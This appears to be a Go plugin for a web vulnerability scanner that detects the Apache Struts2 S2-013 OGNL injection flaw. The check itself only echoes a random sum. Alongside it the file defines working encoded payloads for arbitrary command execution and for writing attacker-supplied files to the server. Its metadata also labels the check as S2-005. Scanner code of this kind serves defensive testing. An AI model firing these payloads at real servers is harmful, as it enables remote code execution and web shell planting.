/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package struts

import (
	"context"
	"strconv"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/utils"
	logger "wscan/core/utils/log"
)

var (
	WebPath013       = "%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23k8out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23k8out.println(%23req.getRealPath(%22%2F%22))%2C%23k8out.close())%7D"
	ExecPayload013   = "%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%7D"
	UploadPaylaod013 = "$%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23fos=%20new%20java.io.FileOutputStream(%23req.getParameter(%22f%22)),%23fos.write(%23req.getParameter(%22t%22).getBytes()),%23fos.close(),%23outstr.println(%22OK%22),%23outstr.close())%7D"
)

type S013 struct {
}

func (*S013) Finger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Infof("开始检测S2-013, %s", flow.Request.URL())
			r1 := utils.RandInt(1000000, 10000000)
			r2 := utils.RandInt(1000000, 10000000)
			payload := ExecPayload013
			payload = strings.Replace(payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
			payload = strings.Replace(payload, "{{r1}}", strconv.Itoa(r1), -1)
			payload = strings.Replace(payload, "{{r2}}", strconv.Itoa(r2), -1)
			req, err := http.NewRequest("GET", utils.UrlJoinPath(flow.Request.URL().String(), payload), nil)
			if err != nil {
				logger.Error(err)
				return nil
			}
			res, err := ab.HTTPClient.Respond(context.TODO(), req)
			if err != nil {
				return nil
			}

			if strings.Contains(res.Text, strconv.Itoa(r1+r2)) {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
			}
			return nil
		},
		Channel: "web-directory",
		Binding: &model.VulnBinding{ID: "struts/s2-005/default", Plugin: "struts/s2-005", Category: "struts/s2-005"},
	}
}
